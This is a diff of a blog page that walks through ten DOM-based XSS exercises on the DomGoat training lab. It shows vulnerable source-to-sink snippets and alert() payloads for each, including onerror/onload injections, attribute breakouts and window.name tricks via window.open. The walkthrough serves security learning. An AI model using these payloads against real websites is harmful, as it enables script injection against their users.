@@ -15,9 +15,16 @@
 
   <!-- External libraries -->
   <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
-  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/styles/monokai-sublime.min.css">
+  <!--<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/styles/.min.css"> -->
   <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.7.1/css/lightbox.css">
 
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.8/styles/default.min.css">
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.8/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script>
+
+
+  <
+  
   <!-- Favicon and other icons (made with http://www.favicon-generator.org/) -->
   <link rel="shortcut icon" href="/assets/icons/favicon.ico" type="image/x-icon">
   <link rel="icon" href="/assets/icons/favicon.ico" type="image/x-icon">
@@ -42,11 +49,11 @@
   
   <!-- Facebook OGP cards -->
   <meta property="og:description" content="DOM-based Cross site Scripting (XSS) is a type of XSS where user input is written to a web pages’ Document Object Model without proper sanitization. This cou..." />
-  <meta property="og:url" content="http://localhost:4000" />
+  <meta property="og:url" content="http://localhost:4000/web-application-security/2020/02/08/08_domgoat_solutions.html">
   <meta property="og:site_name" content="💻 | Blog" />
   <meta property="og:title" content="DomGoat Walkthrough" />
   <meta property="og:type" content="website" />
-  <meta property="og:image" content="http://localhost:4000/assets/domgoat.jpg" />
+  <meta property="og:image" content="http://localhost:4000/assets/blog/appsec/domgoat.jpg" />
   <meta property="og:image:type" content="image/png" />
   <meta property="og:image:width" content="612" />
   <meta property="og:image:height" content="605" />
@@ -57,8 +64,8 @@
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="DomGoat Walkthrough">
   <meta name="twitter:description" content="DOM-based Cross site Scripting (XSS) is a type of XSS where user input is written to a web pages’ Document Object Model without proper sanitization. This cou...">
-  <meta name="twitter:image" content="http://localhost:4000/assets/domgoat.jpg">
-  <meta name="twitter:url" content="http://localhost:4000">
+  <meta name="twitter:image" content="http://localhost:4000/assets/blog/appsec/domgoat.jpg">
+  <meta name="twitter:url" content="http://localhost:4000/web-application-security/2020/02/08/08_domgoat_solutions.html">
   
 
   
@@ -66,7 +73,12 @@
   <!-- Site styles -->
   <link rel="stylesheet" href="/css/main.css">
   <link rel="canonical" href="http://localhost:4000/web-application-security/2020/02/08/08_domgoat_solutions.html">
-  <link rel="alternate" type="application/rss+xml" title="💻 | Blog" href="http://localhost:4000/feed.xml" />
+	<link rel="alternate" type="application/rss+xml" title="💻 | Blog" href="http://localhost:4000/feed.xml" />
+	
+	<!-- Tooltips -->
+	<script type="text/javascript">
+		window.tooltips = []
+	</script>
 </head>
 
 
@@ -84,31 +96,70 @@
     </a>
     <nav role="navigation">
       <ul id="js-navigation-menu" class="navigation-menu show">
-        
-          
-          <li class="nav-link"><a href="/about/">About</a>
-          
-        
-          
-        
-          
-        
-          
-        
-          
-          <li class="nav-link"><a href="/posts/">Posts</a>
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
+				
+	
+	<li class="nav-link"><a href="/about/">About</a>
+	
+
+	
+
+	
+
+	
+	<li class="nav-link"><a href="/posts/">Posts</a>
+	
+
+	
+	<li class="nav-link"><a href="/wallofsheep/">Wall Of Sheep</a>
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+
       </ul>
     </nav>
   </div>
@@ -118,7 +169,7 @@
     <div class="page-content">
         <div class="post">
 
-<div class="post-header-container has-cover" style="background-image: url(/assets/domgoat.jpg);">
+<div class="post-header-container has-cover" style="background-image: url(/assets/blog/appsec/domgoat.jpg);">
   <div class="scrim has-cover">
     <header class="post-header">
       <h1 class="title">DomGoat Walkthrough</h1>
@@ -145,49 +196,50 @@
 <article class="post-content">
   <p>DOM-based Cross site Scripting (XSS) is a type of XSS where user input is written to a web pages’ Document Object Model without proper sanitization. This could be abused by an attacker to manipulate this data to include malicious JavaScript code.</p>
 
-<p>Domgoat has 10 exercises of Dom XSS. Some examples where user input come from are <code class="language-plaintext highlighter-rouge">location.href</code>,<code class="language-plaintext highlighter-rouge">document.URL</code>, <code class="language-plaintext highlighter-rouge">document.baseURI</code> etc leading to a sink function such as <code class="language-plaintext highlighter-rouge">document.write</code>, <code class="language-plaintext highlighter-rouge">document.writeln</code>, <code class="language-plaintext highlighter-rouge">innerHTML</code> etc.</p>
+<p>Domgoat has 10 exercises of Dom XSS. Some examples where user input come from are location.href,document.URL, document.baseURI etc leading to a sink function such as document.write, document.writeln, innerHTML etc.</p>
 
-<p>A detailed explanation of DOM sources can be found here: <a href="https://domgo.at/cxss/sources/somevalue?param1=paramvalue#hashvalue">Client XSS Sources</a></p>
+<p>A detailed explanation of DOM sources can be found here: Client XSS Sources</p>
 
 <ul>
-  <li>URL-based DOM Property Sources - <code class="language-plaintext highlighter-rouge">location.href</code>, <code class="language-plaintext highlighter-rouge">document.URL</code> etc</li>
-  <li>Navigation-based DOM Property Sources - <code class="language-plaintext highlighter-rouge">window.name</code>, <code class="language-plaintext highlighter-rouge">document.referrer</code></li>
-  <li>Communication based Sources - <code class="language-plaintext highlighter-rouge">Window Messaging</code>, <code class="language-plaintext highlighter-rouge">WebSocket</code></li>
-  <li>Storage-based Sources - <code class="language-plaintext highlighter-rouge">SessionStorage</code>, <code class="language-plaintext highlighter-rouge">LocalStorage</code></li>
+  <li>URL-based DOM Property Sources - `location.href, document.URL etc</li>
+  <li>Navigation-based DOM Property Sources - window.name, document.referrer`</li>
+  <li>Communication based Sources - `Window Messaging, WebSocket</li>
+  <li>Storage-based Sources - SessionStorage, LocalStorage`</li>
 </ul>
 
-<p>A detailed explanation of DOM sinks can be found here: <a href="https://domgo.at/cxss/sinks">Client XSS Sinks</a></p>
+<p>A detailed explanation of DOM sinks can be found here: Client XSS Sinks</p>
 
 <ul>
-  <li>Sinks that execute payload as JavaScript - <code class="language-plaintext highlighter-rouge">eval</code>, <code class="language-plaintext highlighter-rouge">setTimeout</code>, <code class="language-plaintext highlighter-rouge">setInterval</code></li>
-  <li>Sinks that evaluate JavaScript URIs - <code class="language-plaintext highlighter-rouge">location</code>, <code class="language-plaintext highlighter-rouge">location.href</code>, <code class="language-plaintext highlighter-rouge">location.assign</code></li>
-  <li>Sinks that execute payload as HTML - <code class="language-plaintext highlighter-rouge">innerHTML</code>, <code class="language-plaintext highlighter-rouge">outerHTML</code>, <code class="language-plaintext highlighter-rouge">document.write</code>, <code class="language-plaintext highlighter-rouge">document.writeln</code></li>
+  <li>Sinks that execute payload as JavaScript - eval, setTimeout, setInterval</li>
+  <li>Sinks that evaluate JavaScript URIs - location, location.href, location.assign</li>
+  <li>Sinks that execute payload as HTML - innerHTML, outerHTML, document.write, document.writeln</li>
 </ul>
 
 <p>This blog will share solutions for <a href="https://domgo.at/cxss/intro">DomGoat</a>, a DOM XSS challenge bed.</p>
 
 <h3 id="exercise---1">Exercise - 1</h3>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    let hash = location.hash;
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    let hash = location.hash;
     if (hash.length &gt; 1) {
         let hashValueToUse = unescape(hash.substr(1));
         let msg = "Welcome &lt;b&gt;" + hashValueToUse + "&lt;/b&gt;!!";
         document.getElementById("msgboard").innerHTML = msg;
     }
 </code></pre></div></div>
-<p>The source where user input is flowing from is <code class="language-plaintext highlighter-rouge">location.hash</code> and the sink where user input ends up is <code class="language-plaintext highlighter-rouge">HTMLElement.innerHTML</code>.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;object/onerror=alert(document.domain)&gt;
+<p>The source where user input is flowing from is location.hash and the sink where user input ends up is HTMLElement.innerHTML.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;object/onerror=alert(document.domain)&gt;
 </code></pre></div></div>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://domgo.at/cxss/example/1?payload=abcd&amp;sp=x#%3Cobject/onerror=alert(document.domain)%3E
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://domgo.at/cxss/example/1?payload=abcd&amp;sp=x#%3Cobject/onerror=alert(document.domain)%3E
 </code></pre></div></div>
 
-<p><img src="/assets/domgoat/xss1.png" alt="" /></p>
+<p><img src="/assets/blog/appsec/xss1.png" alt="" /></p>
 
 <h3 id="exercise---2">Exercise - 2</h3>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    let rfr = document.referrer;
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> let rfr = document.referrer;
     let paramValue = unescape(getPayloadParamValueFromUrl(rfr));
     if (paramValue.length &gt; 0) {
         let msg = "Welcome &lt;b&gt;" + paramValue + "&lt;/b&gt;!!";
@@ -197,15 +249,13 @@
     }
 </code></pre></div></div>
 
-<p>The source where user input is flowing from is <code class="language-plaintext highlighter-rouge">document.referrer</code> and the sink where user input ends up is <code class="language-plaintext highlighter-rouge">HTMLElement.innerHTML</code>.</p>
+<p>The source where user input is flowing from is document.referrer and the sink where user input ends up is HTMLElement.innerHTML.</p>
 
-<p>Looking at the above JavaScript code, the <code class="language-plaintext highlighter-rouge">document.referrer</code> is sent the the <code class="language-plaintext highlighter-rouge">getPayloadParamValueFromUrl</code> function.</p>
+<p>Looking at the above JavaScript code, the document.referrer is sent the the getPayloadParamValueFromUrl function.</p>
 
-<p>This function is looking for a parameter called <code class="language-plaintext highlighter-rouge">payload</code> is returning that to the <code class="language-plaintext highlighter-rouge">msg</code> variable which is then given to <code class="language-plaintext highlighter-rouge">innerHTML</code>.</p>
+<p>This function is looking for a parameter called payload is returning that to the msg variable which is then given to innerHTML.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-
-let getPayloadParamValueFromUrl = function (url) {
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>let getPayloadParamValueFromUrl = function (url) {
 let paramName = "payload=";
 if (url.indexOf(paramName) &gt; -1) { //check for value payload
     let part = url.substr(rfr.indexOf(paramName));
@@ -224,41 +274,41 @@ return "";
 
 <p>The same payload from Exercise 1 can be used. Here Exercise 1 page is first visited.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://domgo.at/cxss/example/1?payload=abcd%3Cobject/onerror=alert(window.location.pathname)%3E&amp;sp=x#11
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://domgo.at/cxss/example/1?payload=abcd%3Cobject/onerror=alert(window.location.pathname)%3E&amp;sp=x#11
 </code></pre></div></div>
 
 <p>The Exercise 2 page can now be visited to execute XSS.</p>
 
-<p><img src="/assets/domgoat/xss2.png" alt="" /></p>
+<p><img src="/assets/blog/appsec/xss2.png" alt="" /></p>
 
 <h3 id="exercise---3">Exercise - 3</h3>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    let responseBody = xhr.responseText;
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    let responseBody = xhr.responseText;
     let responeBodyObject = JSON.parse(responseBody);
     let msg = "Welcome &lt;b&gt;" + responeBodyObject.payload + "&lt;/b&gt;!!";
     document.getElementById("msgboard").innerHTML = msg;
 </code></pre></div></div>
 
-<p>The source where user input is flowing from is <code class="language-plaintext highlighter-rouge">xhr.responseText;</code> and the sink where user input ends up is <code class="language-plaintext highlighter-rouge">HTMLElement.innerHTML</code>.</p>
+<p>The source where user input is flowing from is xhr.responseText; and the sink where user input ends up is HTMLElement.innerHTML.</p>
 
 <p>Here a input form is provided to insert some user input, this is then sent to the following endpoint</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        xhr.open("GET", '/data.json?payload=' + escape(payload), true);
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        xhr.open("GET", '/data.json?payload=' + escape(payload), true);
         xhr.send();
 </code></pre></div></div>
 
-<p>This is then returned <code class="language-plaintext highlighter-rouge">innerHTML</code>.</p>
+<p>This is then returned innerHTML.</p>
 
 <p>A payload such as the following can be inserted into the payload box.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;iframe/onload=alert(window.location.pathname)&gt;
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;iframe/onload=alert(window.location.pathname)&gt;
 </code></pre></div></div>
 
-<p><img src="/assets/domgoat/xss3.png" alt="" /></p>
+<p><img src="/assets/blog/appsec/xss3.png" alt="" /></p>
 
 <h3 id="exercise---4">Exercise - 4</h3>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    let ws = new WebSocket(webSocketUrl);
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  let ws = new WebSocket(webSocketUrl);
     ws.onmessage = function (evt) {
         
         let rawMsg = evt.data;
@@ -268,35 +318,35 @@ return "";
     };
 </code></pre></div></div>
 
-<p>The source where user input is flowing from is <code class="language-plaintext highlighter-rouge">ws.onmessage</code> and the sink where user input ends up is <code class="language-plaintext highlighter-rouge">HTMLElement.innerHTML</code>.</p>
+<p>The source where user input is flowing from is ws.onmessage and the sink where user input ends up is HTMLElement.innerHTML.</p>
 
-<p>Looking at the HTML source, user input from the <code class="language-plaintext highlighter-rouge">payloadbox</code> input form is sent to a <code class="language-plaintext highlighter-rouge">/ws</code> endpoint</p>
+<p>Looking at the HTML source, user input from the payloadbox input form is sent to a /ws endpoint</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      let payload = document.getElementById('payloadbox').value;
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      let payload = document.getElementById('payloadbox').value;
         ws.send(payload);
 </code></pre></div></div>
 
 <p>This is then returned to HTML.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;iframe/onload=alert(window.location.pathname)&gt;
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;iframe/onload=alert(window.location.pathname)&gt;
 </code></pre></div></div>
 
-<p><img src="/assets/domgoat/xss4.png" alt="" /></p>
+<p><img src="/assets/blog/appsec/xss4.png" alt="" /></p>
 
 <h3 id="exercise---5">Exercise - 5</h3>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    window.onmessage = function (evt) {
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    window.onmessage = function (evt) {
         let msgObj = evt.data;
         let msg = "Welcome &lt;b&gt;" + msgObj.payload + "&lt;/b&gt;!!";
         document.getElementById("msgboard").innerHTML = msg;
     };
-
 </code></pre></div></div>
-<p>The source where user input is flowing from is <code class="language-plaintext highlighter-rouge">postMessage</code> and the sink where user input ends up is <code class="language-plaintext highlighter-rouge">HTMLElement.innerHTML</code>.</p>
 
-<p>In the below code, the <code class="language-plaintext highlighter-rouge">window.postMessage()</code> method is used to send a request to a window object and this data is printed back to the <code class="language-plaintext highlighter-rouge">msgboard</code>.</p>
+<p>The source where user input is flowing from is postMessage and the sink where user input ends up is HTMLElement.innerHTML.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   window.onload = function () {
+<p>In the below code, the window.postMessage() method is used to send a request to a window object and this data is printed back to the msgboard.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   window.onload = function () {
         processPayload();
     };
 
@@ -306,64 +356,62 @@ return "";
         frames[0].postMessage(payload, location.origin);
 </code></pre></div></div>
 
-<p>The following can be inserted to the <code class="language-plaintext highlighter-rouge">payloadbox</code>.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;iframe/onload=alert(window.location.pathname)&gt;
+<p>The following can be inserted to the payloadbox.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;iframe/onload=alert(window.location.pathname)&gt;
 </code></pre></div></div>
 
-<p><img src="/assets/domgoat/xss5.png" alt="" /></p>
+<p><img src="/assets/blog/appsec/xss5.png" alt="" /></p>
 
 <h3 id="exercise---6">Exercise - 6</h3>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    let payloadValue = localStorage.getItem("payload", payload);
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    let payloadValue = localStorage.getItem("payload", payload);
     let msg = "Welcome " + payload + "!!";
     document.getElementById("msgboard").innerHTML = msg;
 </code></pre></div></div>
 
-<p>The source where user input is flowing from is <code class="language-plaintext highlighter-rouge">localStorage.getItem</code> and the sink where user input ends up is <code class="language-plaintext highlighter-rouge">HTMLElement.innerHTML</code>.</p>
+<p>The source where user input is flowing from is localStorage.getItem and the sink where user input ends up is HTMLElement.innerHTML.</p>
 
 <p>Any user input inserted into the payloadbox is stored within the browser’s local storage.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   let processPayload = function () {
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   let processPayload = function () {
         let payload = document.getElementById('payloadbox').value;
         localStorage.setItem("payload", payload);
         readPayload();
     };
 </code></pre></div></div>
 
-<p><img src="/assets/domgoat/xss6-1.png" alt="" /></p>
+<p><img src="/assets/blog/appsec/xss6-1.png" alt="" /></p>
 
 <p>This is then reflected back in a user’s page.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;svg/onload=alert(window.location.pathname)&gt;
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;svg/onload=alert(window.location.pathname)&gt;
 </code></pre></div></div>
 
-<p><img src="/assets/domgoat/xss6.png" alt="" /></p>
+<p><img src="/assets/blog/appsec/xss6.png" alt="" /></p>
 
 <h3 id="exercise---7">Exercise - 7</h3>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    let hash = location.hash;
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   let hash = location.hash;
     let hashValueToUse = hash.length &gt; 1 ? unescape(hash.substr(1)) : hash;
     hashValueToUse = hashValueToUse.replace(/&lt;/g, "&amp;lt;").replace(/&gt;/g, "&amp;gt;");
     let msg = "&lt;a href='#user=" + hashValueToUse + "'&gt;Welcome&lt;/a&gt;!!";
     document.getElementById("msgboard").innerHTML = msg;
 </code></pre></div></div>
 
-<p>The source where user input is flowing from is <code class="language-plaintext highlighter-rouge">location.hash</code> and the sink where user input ends up is <code class="language-plaintext highlighter-rouge">HTMLElement.innerHTML</code>.</p>
+<p>The source where user input is flowing from is location.hash and the sink where user input ends up is HTMLElement.innerHTML.</p>
 
-<p>The user input here is concentated as part of a href link <code class="language-plaintext highlighter-rouge">&lt;a href='#user=" + hashValueToUse + "'&gt;Welcome&lt;/a&gt;</code>. In is possible to break out of this attribute context using another JavaScript event handler.</p>
+<p>The user input here is concentated as part of a href link <code class="highlighter-rouge">&lt;a href='#user=" + hashValueToUse + "'&gt;Welcome&lt;/a&gt;</code>. In is possible to break out of this attribute context using another JavaScript event handler.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#' onmouseover=alert(window.location.pathname)//
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#' onmouseover=alert(window.location.pathname)//
 </code></pre></div></div>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://domgo.at/cxss/example/7#%23%27%20onmouseover%3Dalert(window.location.pathname)%2F%2F
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://domgo.at/cxss/example/7#%23%27%20onmouseover%3Dalert(window.location.pathname)%2F%2F
 </code></pre></div></div>
 
-<p><img src="/assets/domgoat/xss7.png" alt="" /></p>
+<p><img src="/assets/blog/appsec/xss7.png" alt="" /></p>
 
 <h3 id="exercise---8">Exercise - 8</h3>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    let hash = location.hash;
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    let hash = location.hash;
     let hashValueToUse = hash.length &gt; 1 ? unescape(hash.substr(1)) : hash;
 
     if (hashValueToUse.indexOf("=") &gt; -1 ) {
@@ -374,21 +422,21 @@ return "";
     }
 </code></pre></div></div>
 
-<p>The source where user input is flowing from is <code class="language-plaintext highlighter-rouge">location.hash</code> and the sink where user input ends up is <code class="language-plaintext highlighter-rouge">HTMLElement.innerHTML</code>.</p>
+<p>The source where user input is flowing from is location.hash and the sink where user input ends up is HTMLElement.innerHTML.</p>
 
-<p>Here from the <code class="language-plaintext highlighter-rouge">location.hash</code> value, the <code class="language-plaintext highlighter-rouge">=</code> sign is check to be present through <code class="language-plaintext highlighter-rouge">hashValueToUse.indexOf("=")+1</code> and everything after this is extracted. Any greater than or less than sign is also converted to HTML entities.</p>
+<p>Here from the location.hash value, the = sign is check to be present through hashValueToUse.indexOf(“=”)+1 and everything after this is extracted. Any greater than or less than sign is also converted to HTML entities.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#' onmouseover=alert(window.location.pathname)//
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#' onmouseover=alert(window.location.pathname)//
 </code></pre></div></div>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://domgo.at/cxss/example/8#=%23%27%20onmouseover%3Dalert(window.location.pathname)%2F%2F
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://domgo.at/cxss/example/8#=%23%27%20onmouseover%3Dalert(window.location.pathname)%2F%2F
 </code></pre></div></div>
 
-<p><img src="/assets/domgoat/xss8.png" alt="" /></p>
+<p><img src="/assets/blog/appsec/xss8.png" alt="" /></p>
 
 <h3 id="exercise---9">Exercise - 9</h3>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    let hash = location.hash;
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   let hash = location.hash;
     let hashValueToUse = hash.length &gt; 1 ? unescape(hash.substr(1)) : hash;
 
     if (hashValueToUse.indexOf("=") &gt; -1 ) {
@@ -405,28 +453,28 @@ return "";
     }
 </code></pre></div></div>
 
-<p>The source where user input is flowing from is <code class="language-plaintext highlighter-rouge">location.hash</code> as part of <code class="language-plaintext highlighter-rouge">window.name</code> and the sink where user input ends up is <code class="language-plaintext highlighter-rouge">HTMLElement.innerHTML</code>.</p>
+<p>The source where user input is flowing from is location.hash as part of window.name and the sink where user input ends up is HTMLElement.innerHTML.</p>
 
-<p>The <code class="language-plaintext highlighter-rouge">Window.name</code> property gets/sets the name of the window’s browsing context. The <code class="language-plaintext highlighter-rouge">location.hash</code> value of this window is then reflected back to the user. This can be emulated by creating a new webpage somewhere with the following JavaScript code.</p>
+<p>The Window.name property gets/sets the name of the window’s browsing context. The location.hash value of this window is then reflected back to the user. This can be emulated by creating a new webpage somewhere with the following JavaScript code.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;html&gt;
-&lt;script&gt;
-window.open('https://domgo.at/cxss/example/9#user=javascript', ':alert(window.location.pathname)');
-&lt;/script&gt;
-&lt;/html&gt;
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+<span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://domgo.at/cxss/example/9#user=javascript</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">:alert(window.location.pathname)</span><span class="dl">'</span><span class="p">);</span>
+<span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
 </code></pre></div></div>
 
-<p>When openedm this will open a new window with the <code class="language-plaintext highlighter-rouge">user</code> parameter being <code class="language-plaintext highlighter-rouge">javascript</code> and the <code class="language-plaintext highlighter-rouge">window.name</code> being <code class="language-plaintext highlighter-rouge">:alert(window.location.pathname)</code>.</p>
+<p>When openedm this will open a new window with the user parameter being javascript and the window.name being :alert(window.location.pathname).</p>
 
-<p><img src="/assets/domgoat/xss9.png" alt="" /></p>
+<p><img src="/assets/blog/appsec/xss9.png" alt="" /></p>
 
 <p>The “Welcome” link can be clicked to execute JavaScript.</p>
 
-<p><img src="/assets/domgoat/xss9-1.png" alt="" /></p>
+<p><img src="/assets/blog/appsec/xss9-1.png" alt="" /></p>
 
 <h3 id="exercise---10">Exercise - 10</h3>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    let urlParts = location.href.split("?");
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   let urlParts = location.href.split("?");
     if (urlParts.length &gt; 1) {
         
         let queryString = urlParts[1];
@@ -454,16 +502,16 @@ window.open('https://domgo.at/cxss/example/9#user=javascript', ':alert(window.lo
     }
 </code></pre></div></div>
 
-<p>The source where user input is flowing from is <code class="language-plaintext highlighter-rouge">location.hash</code> as part of <code class="language-plaintext highlighter-rouge">window.name</code> and the sink where user input ends up is <code class="language-plaintext highlighter-rouge">HTMLElement.innerHTML</code>.</p>
+<p>The source where user input is flowing from is location.hash as part of window.name and the sink where user input ends up is HTMLElement.innerHTML.</p>
 
-<p>The value of the parameter <code class="language-plaintext highlighter-rouge">user</code> is extracted, this value is then checked to see if the value <code class="language-plaintext highlighter-rouge">ID-</code> is present. If so, the value after <code class="language-plaintext highlighter-rouge">ID-</code> is extracted, all double quotes are replaced within this parameter and the <code class="language-plaintext highlighter-rouge">window.name</code> property. this is then inserted as part of a href link: <code class="language-plaintext highlighter-rouge">&lt;a href=\"" + userId + windowValueToUse + "\"&gt;Welcome&lt;/a&gt;</code> which is served to <code class="language-plaintext highlighter-rouge">innerHTML</code>.</p>
+<p>The value of the parameter user is extracted, this value is then checked to see if the value ID- is present. If so, the value after ID- is extracted, all double quotes are replaced within this parameter and the window.name property. this is then inserted as part of a href link: <code class="highlighter-rouge">&lt;a href=\"" + userId + windowValueToUse + "\"&gt;Welcome&lt;/a&gt;</code> which is served to innerHTML.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;
 window.open('https://domgo.at/cxss/example/10?lang=en&amp;user=ID-javascript', ':alert(window.location.pathname)');
 &lt;/script&gt;
 </code></pre></div></div>
 
-<p><img src="/assets/domgoat/xss10.png" alt="" /></p>
+<p><img src="/assets/blog/appsec/xss10.png" alt="" /></p>
 
 </article>
 
@@ -495,20 +543,6 @@ window.open('https://domgo.at/cxss/example/10?lang=en&amp;user=ID-javascript', '
     
     
     
-      <a href="//www.facebook.com/sharer.php?t=DomGoat+Walkthrough&u=http%3A%2F%2Flocalhost%3A4000%2Fweb-application-security%2F2020%2F02%2F08%2F08_domgoat_solutions.html"
-        onclick="window.open(this.href, 'facebook-share', 'width=550,height=255');return false;">
-        <i class="fa fa-facebook-square fa-lg"></i>
-      </a>
-    
-    
-    
-    
-    
-    
-  
-    
-    
-    
     
     
     
@@ -529,120 +563,32 @@ window.open('https://domgo.at/cxss/example/10?lang=en&amp;user=ID-javascript', '
     
     
   
-    
-    
-    
-    
-    
-    
-    
-    
-  
-    
-    
-    
-    
-    
-    
-    
-    
-  
-    
-    
-    
-    
-    
-    
-    
-    
-  
-    
-    
-    
-    
-    
-    
-      <a href="//www.pinterest.com/pin/create/button/?description=DomGoat+Walkthrough&url=http%3A%2F%2Flocalhost%3A4000%2Fweb-application-security%2F2020%2F02%2F08%2F08_domgoat_solutions.html&media=http://localhost:4000/assets/domgoat.jpg"
-        onclick="window.open(this.href, 'pinterest-share', 'width=550,height=255');return false;">
-        <i class="fa fa-pinterest-square fa-lg"></i>
-      </a>
-    
-    
-    
-  
-    
-    
-    
-    
-    
-    
-    
-    
-  
-    
-    
-    
-    
-    
-    
-    
-    
-  
-    
-    
-    
-    
-    
-    
-    
-    
-  
-    
-    
-    
-    
-    
-    
-    
-    
-  
-    
-    
-    
-    
-    
-    
-    
-    
-  
-    
-    
-    
-    
-    
-    
-    
-    
-  
-    
-    
-    
-    
-    
-    
-    
-    
-  
-    
-    
-    
-    
-    
-    
-    
-    
-  
 </section>
+
+	<section class="post-navigation">
+		<span class="prev-post">
+			
+				<a href="/ctf/2019/09/17/10_Exploit_Education_Nebula_Walkthrough.html">
+					<span class="fa-stack fa-lg">
+						<i class="fa fa-square fa-stack-2x"></i>
+						<i class="fa fa-angle-double-left fa-stack-1x fa-inverse"></i>
+					</span>
+					<span class="page-number">Exploit Education - Nebula Walkthrough</span>
+				</a>
+			
+		</span>
+		<span class="next-post">
+			
+				<a href="/application-security/2020/03/01/10_patching_zip_traversal_pclzip.html">
+					<span class="page-number">Patching Zip Traversal within pclzip</span>
+					<span class="fa-stack fa-lg">
+						<i class="fa fa-square fa-stack-2x"></i>
+						<i class="fa fa-angle-double-right fa-stack-1x fa-inverse"></i>
+					</span>
+				</a>
+			
+		</span>
+	</section>
 
 
 
@@ -662,31 +608,70 @@ window.open('https://domgo.at/cxss/example/10?lang=en&amp;user=ID-javascript', '
 
       <p><strong>Site Map</strong></p>
